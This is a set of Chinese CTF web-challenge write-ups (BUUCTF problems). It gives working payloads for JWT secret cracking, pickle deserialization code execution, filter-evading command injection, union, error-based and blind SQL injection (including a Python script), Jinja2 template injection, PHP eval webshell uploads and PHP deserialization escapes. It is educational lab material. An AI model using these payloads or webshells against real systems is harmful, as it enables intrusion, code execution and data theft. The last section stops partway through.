[爆破工具](https://github.com/brendan-rius/c-jwt-cracker)：
```
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEifQ.B-OZYHuG5HRg_eOm_FujDz6VVR6xpA1ENW4jZ5D4qxo
Secret is "1Kun"
```
使用刚刚的工具，得到admin的jwt如下：
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
```
成功进入页面，拿到源码：
```
<!-- 潜伏敌后已久,只能帮到这了 -->
/static/asd1f654e683wq/www.zip
删库跑路前我留了好东西在这里
<!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 -->
```
开始读代码qaq，太tm的多了啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊。发现了发现了！！：
```
(r'/b1g_m4mber', AdminHandler)


class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)

```
这里面有个pickle，和php的序列化那是一个东西，这里完全没有任何的过滤，另外，在models.py中还有一个`desc = "hint:I'm flag man"`并写入到了数据库。  
猜测是使用反序列化漏洞读取文件。看了dalao的博客发现可以加以利用，[资料](http://www.polaris-lab.com/index.php/archives/178/)，并且还有dalao写了极为完善的[脚本](https://github.com/sensepost/anapickle/blob/master/anapickle.py)，尝试使用dalao的脚本：
```
import os
import marshal
import base64
import _pickle as cPickle
import urllib

class genpoc(object):
    def __reduce__(self):
        return (eval, ("open('/flag.txt','r').read()",))

e = genpoc()
poc = cPickle.dumps(e)

print (urllib.parse.quote(poc))
```
这里要注意的是要用python2去生成，python3生成出来的东西没有办法使用qaq。  
得到flag

----
## [极客大挑战 2019]BuyFlag
首先进去又是熟悉的主页，然后我们发现header里面有一个user=0，改成user=1，提示输入password，查看源码发现有post字样，典型的加空格绕过，但是我post过后没有任何的反应？？？？  
查看wp后发现我header又是里面没有`Content-Type: application/x-www-form-urlencoded`。然后又提示我pay，于是post上去money=100000000，提示过长，数组绕过。  
得到flag

----
## [GXYCTF2019]Ping Ping Ping
打开就是一个get请求，输入`ip=127.0.0.1`：
```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
```
发现是一个ping命令，但是fuck了空格和符号
```
ip=127.0.0.1%20     #这样会被fuck
ip=127.0.0.1$IFS$1  #这样没事
ip=127.0.0.1;       #这样没事
```
尝试使用`ip=127.0.0.1;ls`：
```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
flag.php
index.php
```
尝试使用`ip=127.0.0.1;cat$IFS$1flag.php`读取flag.php：
```
fxck your flag!
```
查看index.php
```
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "

";
  print_r($a);
}

?>
```
使用变量绕过`ip=127.0.0.1;q=l;w=a;e=f;r=g;t=.php;cat$IFS$9$e$q$w$r$t`。  
得到flag

----
## [ASIS 2019]Unicorn shop
打开是叫我买unicorn，然后在字符编码utf8那一行提示注意很重要。输入item为1，price不输入，发现报错`unicodedata.numeric(price)`，发现这个判断字符在unicode中是否代表数字的函数，于是到[这个网站](https://www.compart.com/en/unicode/)上搜索thousand，随便找一个大的，我选择的`ↁ`这个，输入item号，提交就行。  
得到flag

----
## [极客大挑战 2019]BabySQL
打开又是一个注入：
```
自从前几次网站被日，我对我的网站做了严格的过滤，你们这些黑客死心吧！！！
```
看上去挺强。sqlmap测试后发现被出题人嘲讽了，看来要么写tamper，要么手工注入。先测试一下关键字，发现大多是关键字被删除，我们使用`<>`来绕过（当然这里也能双写）：
```
check.php?username=admin&password=1' uni<>on sel<>ect 1,2,3%23
# 选择3位置显示

check.php?username=admin&password=1' uni<>on sel<>ect 1,2,group_concat(table_name) fr<>om info<>rmation_schema.tables wh<>ere table_schema = database()%23
# b4bsql,geekuser

check.php?username=admin&password=1' uni<>on sel<>ect 1,2,group_concat(column_name) fr<>om info<>rmation_schema.columns wh<>ere table_name = 'b4bsql'%23
# id,username,password

check.php?username=admin&password=1' uni<>on sel<>ect 1,2,group_concat(username) fr<>om b4bsql%23
#cl4y,sql,porn,git,Stop,badguy,hacker,flag

check.php?username=admin&password=1' uni<>on sel<>ect 1,2,group_concat(passwo<>rd) fr<>om b4bsql wh<>ere username='flag'%23
```
得到flag

----
## [WesternCTF2018]shrine
打开就是源码：
```
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)
```
发现是将flag放在了`flask`的`config`里面，并且在`render`的时候把`config`和`self`整成了`None`，看来是一个模板注入，目的是要我们换个方式查询`flask`的`config`。所以在[flask文档](https://dormousehole.readthedocs.io/en/latest/api.html#flask.Flask)里面找变量有包含`current_app`的，我们就可以读取`config`了。用burp跑一下类似`函数.__globals__`的payload，找到response中含有`current_app`的，最后我使用`{{url_for.__globals__['current_app'].config}}`  
其实这里如果没有过滤config的话，就直接`{{config}}`获取，没有过滤`self`的话也可以通过`{{self.__dict__}}`，没有过滤括号的话，还能用base object通过os读取环境变量来获得  

得到flag

----
## [SWPU2019]Web1
打开是一个登陆页面，简单测试了登录和注册没有注入，然后注册admin显示已有该用户，于是注册一个正常账户，发现是一个广告发布页面，点击发布广告，输入`#`，提示标题含有敏感词汇，于是判断是在此注入。测试发现会删除空格。然后就不知道怎么操作了，看着一大堆东西懵逼。翻了wp才知道原来要点进广告详情才会有显示的qaq。然后我们使用`/**/`绕过空格，并在最后使用单引号闭合，`order by`也是不能使用了。
```
1'union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```
尼玛22个字段，在此问候出题人。正当我以为已经可以注入的时候，发现`information_schema`竟然被过滤了，淦，查阅资料后发现有替代的方法：
```
-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum ns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
```
本以为已经完美解决，没有想到：
```
Table 'sys.schema_auto_increment_columns' doesn't exist
```
wtf，看来得试试另一种方法，看了看innodb也是可以查到表名的：
```
-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
```
得到表名：
```
ads,users
```
接着无列名注入：
```
-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
```
得到flag

----
## [极客大挑战 2019]Upload
打开就是一个文件上传页面，看起来是想让我们来一个图片马。尝试一下test.gif：
```
GIF89
<?php>eval($_GET[cmd]);<php>
```
提示
```
your file included '<?'
```
使用`script`绕过：
```
GIF89
<script language="php">eval($_GET[cmd])</script>
```
显示上传成功，盲猜在`./upload`目录，访问显示正确，但是无法将图片解析为php，遂尝试常见后缀名:
```
.php    .php3   .phtml 
```
发现`phtml`没有被过滤，于是bp安排上。访问`upload/test.phtml`，200成功，这里如果不成功的话就要考虑使用`.user.ini`和`.htaccess`来让服务器将图片解析为php，使用菜刀连接，在根目录找到flag。

----
## [安洵杯 2019]easy_web
打开后一片黑，f12后发现图片后藏有`md5 is funny ~ `，并且观察url：
```
index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=
```
这个cmd就很魔性，img后面跟的是图片名称，可能会存在任意文件读取。观察img名，发现长得很像base64，遂解码：
```
TXpVek5UTTFNbVUzTURabE5qYz0=

第一层(base64)
MzUzNTM1MmU3MDZlNjc=

第二层(base64)
3535352e706e67

第三层(hex)
555.png
```
发现了一串数字，暂时不明白意思，于是尝试后面的cmd，发现常见命令被过滤。于是尝试使用img读取index.php，先加密：
```
TmprMlpUWTBOalUzT0RKbE56QTJPRGN3
```
读取到源码：
```
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');

$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');

$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
```
发现是个md5哈希碰撞，直接找到网上的[payload](https://blog.csdn.net/qq_19980431/article/details/83018232)：
```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```
接下来是绕过这个cmd的waf([更多姿势](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html))，开始先看看目录：
```
cmd=dir /
```
发现flag：
```
bin   dev  flag  lib	media  opt   root  sbin  sys  usr
boot  etc  home  lib64	mnt    proc  run   srv	 tmp  var
```
然后尝试使用变量绕过：
```
cmd=e=t;w=a;q=c;$q$w$e /flag
```
然后发现过滤了分号和$符号，shit，然后尝试另外的绕过：
```
cmd=ca\t /flag
```
得到flag

----
## [GXYCTF2019]禁止套娃
打开就在质问我的灵魂：
```
flag在哪里呢？
```
bp里面也没看见啥可疑的东西，于是盲猜`/flag.php`，然后这个东西是存在的，我们使用`dirsearch`扫一遍目录，然后发现了`.git`目录，于是使用`githack`获得源码，index.php：
```
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```
第一个if是检测有无伪协议，第二个if是限制只能用函数（说好的禁止套娃），第三个if是过滤了一堆奇怪的东西。翻一下[常用函数](https://greenlightt.github.io/2017/10/25/php-function/)，找一个函数提供最基本的字符，然后使用子串切割得到我们想要的数据：
```
exp=var_dump(scandir(pos(localeconv())));
```
查看到目录：
```
[0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(4) ".git"
  [3]=>
  string(8) "flag.php"
  [4]=>
  string(9) "index.php"
```
由于flag在数组第三位，所以我们使用反向+位移：
```
exp=show_source(next(array_reverse(scandir(pos(localeconv())))));
```

----
## [ACTF2020 新生赛]Include
打开后点击tips就能看见url后面添加了一个`?file=flag.php`，结合题目名称来看，是include了一个文件，猜测可以采用php伪协议读取`flag.php`查看源码：
```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```
得到flag

----
## [CISCN 2019 初赛]Love Math
打开就能看见源码：
```
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
} 
```
白名单中只留下了数学相关函数，注意到`base_convert()`函数的转换功能极其强大，可以进行任意进制转换，选择36进制即可表示所有字母（十个数字加上二十六个字母），然后使用`base_convert()`把`hex2bin`整出来，用它将16进制数转换为字符串，就可以实现任意代码执行了：
```
base_convert(37907361743,10,36) <=> hex2bin
hex2bin(dechex(1598506324))     <=> _GET
```
弄出来过后我们就要用到php的一个特性：
```
$pi=base_convert(37907361743,10,36)(dechex(1598506324))
```
这样我们就可以将`$pi`当成`_GET`来使用了：
```
$_GET[acos]&$_GET[abs]&acos=system&abs=cat%20/flag  =>  $$pi[acos]&$$pi[abs]&acos=system&abs=cat%20/flag
```
所以最终的payload为：
```
$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi{acos})($$pi{abs})&acos=system&abs=cat%20/flag
```
得到flag

----
## [BJDCTF2020]Mark loves cat
打开看起来是个静态页面，先扫一下目录，发现有.git泄露，于是`githack`，得到index.php：
```
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}

echo "the flag is: ".$flag;
```
梳理程序逻辑，看上去像一个变量覆盖，回显有好几个，第一个for是将get上去的参数名当成一个变量名，保存的数据就是参数（简单点说就是把数组变量化）。第二个for是将变量的值修改为与变量的值同名的变量的值。这下思路就清晰了，大概就是将flag写入到一个exit里面，就可以回显出`$flag`：
```
GET:    yds=flag
POST:   flag=123    # 这里只需要让程序检测到有flag提交
```
得到flag

----
## [watevrCTF-2019]Pickle Store
看题目应该知道是一个反序列化，打开后发现有三个POST，bp抓包，发现session是base64编码的pickle代码：
```
gAN9cQAoWAUAAABtb25leXEBTeABWAcAAABoaXN0b3J5cQJdcQMoWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBFgVAAAAWXVtbXkgc3RhbmRhcmQgcGlja2xlcQVlWBAAAABhbnRpX3RhbXBlcl9obWFjcQZYIAAAADMyYmMxOGZkYjNjZGQwNDEzYjJkYWYwNGE4NzQ2ZjVkcQd1Lg==
```
`pickle.loads`一下：
```
{'money': 480, 'history': ['Yummy standard pickle', 'Yummy standard pickle'], 'anti_tamper_hmac': '32bc18fdb3cdd0413b2daf04a8746f5d'}
```
好了我们这下知道了，这尼玛钱竟然是存在这里面的，我们先用pickle整出来一个字典，然后base64编码，用bp改掉（这里我们改成了5000）：
```
gAN9cQAoWAUAAABtb25leXEBTYgTWAcAAABoaXN0b3J5cQJdcQMoWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBGgEaARlWBAAAABhbnRpX3RhbXBlcl9obWFjcQVYIAAAADI2MmFmYmI2NmU0N2U4MzMxMDdjNDFlNjE0MjNlOWZlcQZ1Lg==
```
结果并没有什么卵用，看来那个`anti_tamper_hmac`是防止cookie篡改的，查了一下发现这个算法强得一p，看来不是简单的改cookie。考虑pickle反序列化漏洞

----
## [GXYCTF2019]BabySQli
sql注入，测试下万能密码：
```
user=admin' or 1=1%23
```
发现被过滤。于是fuzz发现是过滤了:括号，等号。页面源码里面有一个：
```
MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5
# 第一层是base32
c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==
# 第二层是base64
select * from user where username = '$name'
得到查询语句
```
尝试联合注入：
```
admin'union select 1,2,3%23
```
测试用户名所在字段：
```
name=1'union select admin,1,3#&pw=123456
->Error: Unknown column 'admin' in 'field list'
```
发现有三个字段，并且用户名在第二个字段，但显示wrong password，无其他回显，所以猜测可能是先查询到相应的用户信息，再和密码比对，翻看wp后发现竟然是md5比对，吐血：
```
name=1'union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&pw=123456
```
得到flag

----
## [ACTF2020 新生赛]Exec
打开是个ping，看起来是个rec，源码里面没有奇怪的东西，直接尝试多行语句：
```
127.0.0.1;ls /
```
发现flag，直接读取
```
127.0.0.1;cat /flag
```
得到flag

----
## [极客大挑战 2019]HardSQL
看题目就知道是个sql注入，而且看起来好像很吓人的样子，fuzz过后发现过滤了：
```
union ascii substr order by if 空格和一大堆逻辑运算符
```
考虑报错注入，空格用括号绕过，等号用like绕过：
```
# 爆库名 geek
username=admin'or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))%23&password=123
# 爆表名 H4rDsq1
username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),0x7e),1))%23&password=123
# 爆列名 id,username,password
username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&password=123
# 读数据 flag{4d2e4d96-3b6c-4604-9675-66 (只有一部分)
username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23&password=123
# 读剩下的 }72835b80f066-5769-4064-c6b3-69 >=> 96-3b6c-4604-9675-660f08b53827}
username=admin'or(updatexml(1,(reverse(concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e))),1))%23&password=123
```
得到flag

## [GYCTF2020]Blacklist
应该是一个注入，看起来像是随便注的升级版，先试试随便注的payload，发现果然升级了：
```
# 查表名 hahahah FlagHere
1';show tables;#

# 查列名 flag
1';show columns from `FlagHere`#

# select
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```
这下用不了随便注的重命名，预编译，改库名QWQ，查[资料](https://xz.aliyun.com/t/7169)，不过还是有个handler（mysql专属）可以用的：
```
-1';handler `FlagHere` open as a;handler `a` read first;#
```
注意里面是反引号  
得到flag

----
## [GWCTF 2019]我有一个数据库
打开：
```
我有一个数据库，但里面什么也没有~
不信你找
```
页面里面什么也没有，于是dirsearch扫：
```
403 -  316B  - /.hta
200 -   84KB - /phpinfo.php
200 -   75KB - /phpmyadmin/
200 -   36B  - /robots.txt
```
进入phpmyadmin，结果发现test表里面并没有什么东西，咕果搜索phpmyadmin漏洞，发现一个[远程文件包含漏洞](https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/)，直接使用payload：
```
?target=db_sql.php%253f/../../../../../../../../flag
```
得到flag

----
## [BJDCTF2020]Easy MD5
打开就是一个查询页面，在header里面发现了hint：
```
select * from 'admin' where password=md5($pass,true)
```
看起来是想让我们传入的参数进行md5后再比对，找到了[一篇文章](https://blog.csdn.net/greyfreedom/article/details/45846137):
```
password=ffifdyop
```
得到hint：
```
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
```
显然是利用php弱类型，0e开头的字符串，见[文章](https://blog.csdn.net/qq_19980431/article/details/83018232)，再次得到hint：
```
 <?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
} 
```
不知道为啥哈希碰撞的方法不管用，于是使用了`error===error`:
```
param1[]=1
param2[]=2
```
得到flag

----
## [ACTF2020 新生赛]BackupFile
看名字应该是一个源码泄露或者文件备份，进入页面：
```
Try to find out source file!
```
dirsearch扫目录，index.php.bak：
```
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```
直接使用：
```
key=123
```
php在数字与字符串进行比较时，php会尝试转换字符串为整数，遇到第一个字母时停止：
```
echo 123=='123qqq'
1
```
得到flag

----
## [安洵杯 2019]easy_serialize_php
打开得到源码：
```
 <?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
} 
```
理清程序逻辑：程序先将post上去的数据化为本地数据，这里给我们提供了操作session的地方，然后img_path这里将img修改了，但是程序最后要用到img，所以猜测这里就是反序列化要逃逸掉的东西。filter这个函数就是关键所在，将seriallize后的数据进行替换，但是没有对相应的长度数据进行修改，所以导致了这个反序列化的问题。另外，还在phpinfo中发现了`d0g3_f1ag.php`这个可疑文件。所以我们开始操作，我们想要的数据大概长这样：
```
_SESSION[]="s:4:"user";s:2:"dd";s:8:"function";s:10:"show_image";s:3:"img";s:20:"d0g3_f1ag.php""
```
但是img会被替换，所以要这样操作：
```
_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"a";s:1:"a";}
```
后面那个a我也不知道为啥要加上，反正不加的话就没效果（感觉是用来凑数的），还有一种方法就是换user，专业点叫键逃逸，之前那种叫值逃逸：
```
_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```
得到路径：
```
$flag = 'flag in /d0g3_fllllllag';
```
访问：
```
_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:1:"a";s:1:"a";}
```
得到flag

----
## [ACTF2020 新生赛]Upload
文件上传，测试发现前端有过滤，使用bp改文件后缀为phtml可绕过：
```
<?php eval($_POST['a']); ?>
```
得到shell

----
## [SUCTF 2019]EasyWeb
打开就能看见源码：
```
<?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>
```
程序过滤了所有的数字和字母，这就要用到一点高端知识：[无数字字母shell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)和[资料](https://www.cnblogs.com/20175211lyz/p/11488051.htm)和[资料](https://zhengbao.wang/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97shell/)，使用字符串的异或等操作构造出来字符，太高端了，[看不懂](https://blog.csdn.net/weixin_44077544/article/details/102858790)

## [CISCN2019 总决赛 Day2 Web1]Easyweb
先扫目录：
```
200 -    6KB - /.DS_Store
403 -  322B  - /.hta
200 -    0B  - /config.php
301 -  390B  - /images  ->  http://5547d06a-fb61-43c3-aaa5-248385301404.node3.buuoj.cn/images/
200 -    2KB - /index.php
388B  - /logs  ->  http://5547d06a-fb61-43c3-aaa5-248385301404.node3.buuoj.cn/logs/
200 -   33B  - /robots.txt
403 -  331B  - /server-status
200 -   86B  - /upload.php
302 -    0B  - /user.php  ->  index.php
```
ds文件泄露，这还是第一次遇到，文件泄露[总结](http://sunu11.com/2017/04/28/11/)，访问`robots.txt`，发现里面有奇怪的东西：
```
User-agent: *
Disallow: *.php.bak
```
不允许搜索引擎爬取.bak文件，所以我们手动访问一下：
```
image.php.bak
```
得到源码：
```
<?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);
```
看起来像是一个注入，但是过滤了单引号，导致我们没有办法闭合，我们查看官方文档：
> PHP 5.4 之前 PHP 指令 magic_quotes_gpc 默认是 on， 实际上所有的 GET、POST 和 COOKIE 数据都用被 addslashes() 了。 不要对已经被 magic_quotes_gpc 转义过的字符串使用 addslashes()，因为这样会导致双层转义。 遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。

绕过：
```
id=\0'&path=%20or%20length((select group_concat(password) from users))=20%23
```
布尔盲注：
```
import requests

url = "http://dbfe7b37-c752-453b-9124-7813507af736.node3.buuoj.cn/image.php?id=\\0'&path="

payload = "or id=if(ascii(substr((select password from users),{0},1))>{1},1,0)%23"

result = ''

for i in range(1,100):
    l = 1
    r = 130
    mid = (l + r)>>1

    while(l<r):
        payloads = payload.format(i,mid)
        print(url+payloads)
        html = requests.get(url+payloads)

        if "JFIF" in html.text:
            l = mid +1
        else:
            r = mid
        mid = (l + r)>>1

    result+=chr(mid)
    print(result)
```
得到admin的密码，然后登录，发现文件上传页面，传一个马上去看看：
```
<?php eval($_POST[cmd]);?>
```
`.phtml`结果表示并不能看见上传到哪了，不过它是将文件名写入一个php文件里面作为日志，所以：
```
filename=<?=@eval($_POST['cmd']);?>
```
蚁剑连上去，得到flag

----
## [GYCTF2020]FlaskApp
以前做了，现在来复现一下，是个模板注入，flask，jinjia2引擎，首先要找到可利用的基类：
```
{{''.__class__.__base__}}
```
找到obj类：
```
class object
```
然后找到可利用的类：
```
{{''.__class__.__base__.__subclasses__()[75].__init__.__globals__}}
```
